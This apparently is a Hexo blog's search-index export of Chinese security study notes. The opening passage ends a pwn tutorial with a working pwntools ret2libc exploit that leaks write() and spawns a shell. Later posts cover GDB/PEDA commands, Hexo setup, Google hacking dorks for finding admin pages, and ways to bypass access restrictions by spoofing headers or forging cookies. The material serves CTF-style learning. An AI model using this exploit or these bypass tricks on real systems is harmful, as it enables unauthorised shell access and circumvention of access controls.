跳转到真正的write()函数上去。因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。使用ldd【 ldd命令用于判断某个可执行的 binary 档案含有什么动态函式库】命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址： 最后写exp： #!python #!/usr/bin/env python from pwn import * libc = ELF(&apos;libc.so&apos;) elf = ELF(&apos;test3&apos;) p = process(&apos;./test3&apos;) #p = remote(&apos;127.0.0.1&apos;, 10003) plt_write = elf.symbols[&apos;write&apos;] print &apos;plt_write= &apos; + hex(plt_write) got_write = elf.got[&apos;write&apos;] print &apos;got_write= &apos; + hex(got_write) vulfun_addr = 0x0804844d print &apos;vulfun= &apos; + hex(vulfun_addr) payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4) print &quot;\n###sending payload1 ...###&quot; p.send(payload1) print &quot;\n###receving write() addr...###&quot; write_addr = u32(p.recv(4)) print &apos;write_addr=&apos; + hex(write_addr) print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot; system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]) print &apos;system_addr= &apos; + hex(system_addr) binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;))) print &apos;binsh_addr= &apos; + hex(binsh_addr) payload2 = &apos;a&apos;*140 + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr) print &quot;\n###sending payload2 ...###&quot; p.send(payload2) p.interactive() 小结：本文主要根据大牛的文章一步一步进行操作和学习，当然一下子也很难全部接受，后面还要多加温习，熟能生巧。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GDB寄存器和内存查询指令]]></title>
    <url>%2F2016%2F11%2F12%2FGDB%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%86%85%E5%AD%98%E6%9F%A5%E8%AF%A2%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[今天下午学习pwn的基础知识，遇到了两个查询容易弄扯，在这儿总结下子。 1、查看寄存器 (gdb) i r(gdb) i r a # 查看所有寄存器（包括浮点、多媒体）(gdb) i r esp(gdb) i r pc 2、查看内存 (gdb) x /wx 0x80040000 # 以16进制显示指定地址处的数据(gdb) x /8x $esp(gdb) x /16x $esp+12(gdb) x /16s 0x86468700 # 以字符串形式显示指定地址处的数据(gdb) x /24i 0x8048a51 # 以指令形式显示指定地址处的数据（24条） 3、修改寄存器的值 (gdb) set $v0 = 0x004000000(gdb) set $epc = 0xbfc00000 4、修改内存的值 (gdb) set {unsigned int}0x8048a51=0x0(gdb) set (unsigned int)0x8048a54=0x55aa55aa 5、内存搜索 Usage: find (gdb) define findset $ptr = $arg0set $cnt = 0while ( ($ptr&lt;=$arg1) &amp;&amp; ($cnt&lt;$arg2) ) if ( (unsigned int )$ptr == $arg3 ) x /wx $ptr set $cnt = $cnt + 1 end set $ptr = $ptr + 4endend 6、断点、监测点 (gdb) b 0x80400000(gdb) watch (unsigned int *)0xbffff400==0x90909090]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>寄存器 debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb与peda指令学习学习笔记]]></title>
    <url>%2F2016%2F10%2F30%2Fgdb%E4%B8%8Epeda%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[下午学习的gdb指令。傻傻的对一个自己的程序输入打开指令打不开。问问才知道要先转换成可执行文件，上网有学学gcc指令收获不少啊。。 遇到问题1、写了一个C++语言但是用指令转换成可执行文件时候呢显示iostream不存在解决：对于C语言使用的转换指令是（假设文件是doc.c）将C语言的文件doc.c转换为了doc gcc doc.c -o doc 还有一个默认转换，也就是后面可以不加你转换的名字，系统默认转换后的名字为a.out gcc doc.c 对于C++语言使用的转换指令是 g++ doc.c -o doc 2、显示j=strlen(s)语句出错。解决：原来linux的习惯，strlen声明放在 string.h 中(linux系统中可以通过man strlen来查看其帮助和所在头文件)，仅仅 #include 只是引入了 std::string，还需要 #include ###3、其他指令(1)、 将test.c预处理输出test.i文件。 gcc -E test.c -o test.i (2)、 将预处理输出文件test.i汇编成test.s文件。 gcc -E test.c -o test.i (3)、 将汇编输出文件test.s编译输出test.o文件。 gcc -c test.s (4)、 将编译输出文件test.o链接成最终可执行文件test。 gcc test.o -o test (5)、 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长。 gcc -O1 test.c -o test 4、多源文件的编译方法(1)、多个文件一起编译将testfun.c和test.c分别编译后链接成test可执行文件。 gcc testfun.c test.c -o test (2)、分别编译各个源文件，之后对编译后输出的目标文件链接。将testfun.c编译成testfun.o将test.c编译成test.o将testfun.o和test.o链接成test gcc -c testfun.cgcc -c test.cgcc -o testfun.o test.o -o test 在搜索的过程中也发现了一个好玩的命令就先记录下吧，这是个gdb下的指令。 如果想看看现在的默认反汇编格式是什么，可以使用如下命令 (gdb) show disassembly-flavor 如果看不懂，那就转换汇编格式 (gdb) set disassembly-flavor intel 经过以上的步骤就可以把想要的可执行文件得到，下面就是对程序进行指令分析。程序为(doc) 运行程序看看 ./doc 进入gdb指令下。（gdb + doc）反编译 disassemble main 下面是基础的调试指令 名称 介绍 用法 r r 是run的简写，也就是在GDB下运行程序。（如果有设置断点会运行到断点） （gdb）r c C是continue的简写，就是继执行被调试的程序，直到下一次断点处或者结束 （gdb）c b &lt;行号&gt;/&lt;函数名称&gt;/&lt;函数名称&gt;/&lt;代码地址&gt; b 是breakpoint的简写，就是设置断点，可以使用行号，函数名，执行地址进行下断。而函数名前加一个*则表示将断点设置在“由编译器生成的prolog代码处”，者在了解汇编后可以理解。 （gdb）b 8、（gdb）b main 、(gdb)b main 、（gdb）b 0x8048534 d [编号] d 是delete breakpoint的简写，就是删除制定编号后的断点，也可以一次删去所有断点。 （gdb）d 2 p &lt;变量名称&gt; P是print的简写，显示指定变量的值（临时变量或全局变量）。 （print）p n q 不需要多解释了，就是退出调试 （gdb）q S 执行一行源代码，如果此行代码有函数调用，进入该函数，也就相当于其他调试器的单步步入。 （gdb）s n 执行一段源代码，代码中的函数调用也一并执行，也就相当于其他调试器的单步步过。 （gdb）n Si ,ni 这两个对应着的是s和n。不同的是这两个是对汇编语言的，而前两个是对源代码的。 （gdb）si、（gdb）ni 然后是peda的一些指令 checksec –检查二进制的各种安全选项dumpargs –当在调用指令时停止显示参数传递给函数elfheader–调试文件的标题指令elfsymbol–从一个精灵文件获得非调试符号信息lookup –搜索所有的地址/参考地址属于一个内存范围readelf –从一个逆向文件获取标题信息patch –内存补丁开始在字符串/ hexstring /诠释一个地址（？）pattern –生成、搜索或写一个循环模式到内存pshow –显示各种PEDA选项和其他设置pset –设置各种peda选项和其他设置procinfo –显示从/ proc / PID的各种信息shellcode –生成或下载常见shellcodesxormem –一个密钥异或内存区vmmap –在调试过程中获得部分（S）的虚拟映射地址范围ropgadget–得到的二进制或静态库共同ROP小工具ropsearch –记忆中搜索rop小工具使用skeleton –Python开发代码生成模板dumprop –丢弃在特定的内存范围内所有ROP小工具searchmem|find –在记忆中搜索模式；支持正则表达式搜索 指令中提到了一个ROP，也不知道是啥，去搜一搜，原来：ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等） 这个溢出攻击可参照网址：http://www.programlife.net/linux-rop-stack-overflow.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo搭建]]></title>
    <url>%2F2016%2F09%2F04%2Fhexo%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[Hexo搭建Github静态博客 应用GitHub Pages创建属于自己的个人博客，GitHub将提供免费的空间。GitHub提供的域名（用户名+github+io）,在Repository name对应处填写资源名，其需要使用自己的用户名，每个用户名下面只能建立一个，并且资源命名必须符合这样的规则username/username.github.io，之后勾选下面的”Initialize this repository with a README” 1.环境1.1安装Git下载地址：https://git-scm.com/download/win下载安装包后正常安装即可。 1.2安装node.js下载地址：http://nodejs.org/download/可以下载 node-v0.10.33-x64.msi安装时直接保持默认配置即可。 2.配置Github1.1建立Repository建立与你用户名对应的仓库，仓库名必须为【your_user_name.github.io】 1.2配置SSH-Key参考：http://beiyuu.com/github-pages 3.安装Hexo关于Hexo的安装配置过程，请以官方Hexo给出的步骤为准。 3.1Installation打开Git命令行，执行如下命令 $ npm install -g hexo 3.2 Quick Start1.Setup your blog在电脑中建立一个名字叫「Hexo」的文件夹（比如我建在了D:\Hexo），然后在此文件夹中右键打开Git Bash。执行下面的命令 $ hexo init[info] Copying data[info] You are almost done! Don’t forget to run npm install before you start blogging with Hexo! Hexo随后会自动在目标文件夹建立网站所需要的文件。然后按照提示，运行 npm install（在 /D/Hexo下） npm install 会在D:\Hexo目录中安装 node_modules。 2.Start the server运行下面的命令（在 /D/Hexo下） $ hexo server[info] Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. 3. Create a new post新打开一个git bash命令行窗口，cd到/D/Hexo下，执行下面的命令 $ hexo new “My New Post”[info] File created at d:\Hexo\source_posts\My-New-Post.md 刷新http://localhost:4000/，可以发现已生成了一篇新文章 “My New Post”。 NOTE:有一个问题，发现 “My New Post” 被发了2遍，在Hexo server所在的git bash窗口也能看到create了2次。 $ herxo serve[info] Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.[create] d:\Hexo\source_posts\My-New-Post.md[create] d:\Hexo\source_posts\My-New-Post.md 经验证，在hexo new “My New Post” 时，如果按Ctrl+C将hexo server停掉，就不会出现发2次的问题了。 所以，在hexo new文章时，需要stop server。 4. Generate static files执行下面的命令，将markdown文件生成静态网页 $ hexo generate 该命令执行完后，会在 D:\Hexo\public\ 目录下生成一系列html，css等文件。 5. 编辑文章 hexo new “My New Post”会在D:\Hexo\source_posts目录下生成一个markdown文件：My-New-Post.md可以使用一个支持markdown语法的编辑器（比如 Sublime Text 2）来编辑该文件。 6. 部署到Github 部署到Github前需要配置_config.yml文件，首先找到下面的内容 #Deployment ##Docs: http://hexo.io/docs/deployment.htmldeploy: type: 然后将它们修改为 #Deployment ##Docs: http://hexo.io/docs/deployment.htmldeploy: type: github repository: git@github.com:zhchnchn/zhchnchn.github.io.git branch: master NOTE1:Repository：必须是SSH形式的url（git@github.com:zhchnchn/zhchnchn.github.io.git），而不能是HTTPS形式的url（https://github.com/zhchnchn/zhchnchn.github.io.git），否则会出现错误： $ hexo deploy[info] Start deploying: github[error] https://github.com/zhchnchn/zhchnchn.github.io is not a valid repositor URL! 使用SSH url，如果电脑没有开放SSH 端口，会致部署失败。 fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. NOTE2：如果你是为一个项目制作网站，那么需要把branch设置为gh-pages。7. 测试当部署完成后，在浏览器中打开http://zhchnchn.github.io/（https://zhchnchn.github.io/） ，正常显示网页，表明部署成功。8. 总结：部署步骤每次部署的步骤，可按以下三步来进行。 hexo cleanhexo generatehexo deploy 9. 总结：本地调试 在执行下面的命令后， $ hexo g #生成$ hexo s #启动本地服务，进行文章预览调试 浏览器输入http://localhost:4000，查看搭建效果。此后的每次变更_config.yml 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。 2. 可以用简化的一条命令 hexo s -g 命令总结3.3.1常用命令 hexo new “postName” #新建文章hexo new page “pageName” #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）hexo deploy #将.deploy目录部署到GitHubhexo help # 查看帮助hexo version #查看Hexo的版本 3.3.2 hexo deploy -g #生成加部署hexo server -g #生成加预览 命令的简写为： hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy 4 配置Hexo4.1 配置文件介绍下面的各个部分的介绍，请直接参考【3】。 1._config.yml配置文件介绍NOTE：在修改_config.yml配置文件时，按照【3】的介绍进行修改后，重新 hexo clean 或者hexo deploy时，可能会出现如下错误： $ hexo clean[error] { name: ‘HexoError’, reason: ‘can not read a block mapping entry; a multiline key may not be an imp licit key’, mark: { name: null, buffer: ‘# Hexo Configuration\n## Docs: http://hexo.io/docs/configuration.h tml\n## Source: https://github.com/hexojs/hexo/\n\n# Site\ntitle: Zhchnchn\nsubt itle: Coding on the way\ndescription: Zhchnchn\’s blog\nauthor: Zhchnchn\nemail:115063497@qq.com\nlanguage:zh-CN\n\n# URL\n## If your site is put in a subdirect …… , position: 249, line: 12, column: 0 }, message: ‘Config file load failed’, domain: { domain: null, _events: { error: [Function] }, _maxListeners: 10, members: [ [Object] ] }, domainThrown: true, stack: undefined } 我的_config.yml配置文件是一个空行，所以错误肯定在前面，经过对比发现，我前面修改了一下 # Site的各项设置，在冒号:后面没留空格导致了该问题，请对比一下下面的区别： 错误的设置： author:Zhchnchnemail:XXX@qq.comlanguage:zh-CN 正确的设置： author: Zhchnchnemail: XXX@qq.comlanguage: zh-CN (问题在于必须要有空格) 4.2 安装主题Hexo提供了很多主题，具体可参见Hexo Themes【4】。这里我选择使用Pacman主题。具体设置方法如下【5】 4.2.1安装 将Git Shell 切到/D/Hexo目录下，然后执行下面的命令，将pacman下载到 themes/pacman 目录下。 $ git clone https://github.com/A-limon/pacman.git themes/pacman 修改你的博客根目录/D/Hexo下的config.yml配置文件中的theme属性，将其设置为pacman。 更新pacman主题 cd themes/pacmangit pull NOTE：先备份_config.yml 文件后再升级 4.4.2配置如果pacman的默认设置不能满足需要的话，你可以修改 /themes/pacman/下的配置文件_config.yml来定制。 详细主题跟新安装参照【http://blog.csdn.net/qq_23435721/article/details/50938038】 5.发布文章 $ hexo new “My New Post”[info] File created at d:\Hexo\source_posts\My-New-Post.mdhexo g #生成静态文件hexo g -d #部署到Github]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google hacking 语法]]></title>
    <url>%2F2016%2F09%2F03%2FGoogle-hacking-%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.单词语法 intext:这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入：intext：动网，将返回所有在网页正文部分包含”动网”的网页。 allintext:使用方法和intext类似. intitle:和上面那个intext差不多，搜索网页标题中是否有我们所要找的字符，例如搜索：intitle：安全天使，将返回所有网页标题中包含“安全天使”的网页。同理allintitle也同intitle类似。 cache:搜索google里关于某些内容的缓存，有时候也许能找到一些好东西哦。 define:搜索某个词语的定义。搜索：define：hacker，将返回关于hacker的定义。 filetype:这个我要重点推荐一下，无论是撒网式攻击还是我们后面要说的搜索指定类型的文件。例如输入：filetype：doc，将返回所有以doc结尾的文件URL。当然如果你找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富。 info:查找指定站点的一些基本信息。 inurl:搜索我们指定的字符是否存在于URL中。例如输入：inurl：admin，将返回N个类似于这样的连接：http://www.xxx.com/xxx/admin。用来找管理员登陆的URL不错。allinurl也同inurl类似，可指定多个字符。 符号语法+ 把google可能忽略的字列如查询范围 -把某个字忽略 ~同意词 .单一的通配符 *通配符，可代表多个字母 “”精确查询]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>search</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过网站访问限制的方法]]></title>
    <url>%2F2016%2F09%2F03%2F%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.只允许国外访问: 将 HTTP 请求头中的 Accept-Language 为中文(cn-zh)，修改为英文(en-us)。 2.浏览器限制访问:修改 HTTP 请求中的 User-Agent 信息。里面标注的有访问所用的浏览器和系统版本。也可以使用火狐的default user agent插件进行修改。 3.IP地址限制访问：跟 HTTP 请求头中的 X-Forwarded-For、client-ip、remote_addr 有关系，也可以使用代理进行访问。 4.用户登陆限制访问：可能是 Cookie 的问题，如果 Cookie 比较简单，可以尝试构造cookie。 5.隐藏信息：查看 robots.txt 可以获得该网站的一些信息。 6.其他：有一些加referer加上代理ip PS：原文:(http://byd.dropsec.xyz)]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>